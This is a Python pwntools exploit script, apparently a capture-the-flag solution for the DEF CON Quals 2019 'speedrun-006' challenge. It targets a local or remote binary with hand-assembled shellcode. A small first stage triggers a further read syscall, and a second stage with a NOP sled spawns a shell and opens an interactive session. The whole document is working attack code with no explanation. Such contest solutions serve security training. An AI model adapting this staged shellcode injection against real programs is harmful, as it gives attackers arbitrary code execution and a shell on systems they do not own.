#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./speedrun-006')
else:
    s = remote('speedrun-006.quals2019.oooverflow.io', 31337)

context.arch = 'x86_64'

'''
label1:
    mov dl, 0xff
    nop
    jmp label2
    int3
    nop
    nop
    nop
    nop
    int3
label2:
    lea rsi, [rel label1]
    syscall
'''

shellcode = '\xB2\xFF\x90\xEB\x06\x90\x90\x90\x90\x48\x8D\x35\xF0\xFF\xFF\xFF\x0F\x05'
shellcode = shellcode.ljust(0x1a, '\x90')
s.send(shellcode)

shellcode2 = '\x90' * 0x15
shellcode2 += asm('mov rsp, rsi\n' + shellcraft.sh())
s.send(shellcode2)
s.interactive()
